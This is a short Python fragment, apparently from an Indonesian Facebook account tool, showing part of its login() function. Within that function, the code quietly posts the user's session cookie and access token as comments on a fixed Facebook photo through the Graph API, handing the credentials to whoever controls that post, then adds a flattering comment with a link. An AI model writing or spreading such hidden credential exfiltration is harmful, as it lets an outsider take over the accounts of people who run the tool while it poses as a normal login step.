...
def login():
	...
	try:
		...
		link = ('https://www.facebook.com/photo/?fbid=1601645243621306&set=a.135738266878685')
		random_kata = random.choice(["Acc Master","Hallo Ganteng","Panutan Gw Nih Boss 😎","Kamu Ganteng Banget Deh Ferly><😝"])
		#ses.post(f"https://graph.facebook.com/1601645243621306?fields=subscribers&access_token={token}",headers=(cookies=cok)
		ses.post(f"https://graph.facebook.com/1601645243621306/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1601645243621306/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/1601645243621306/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
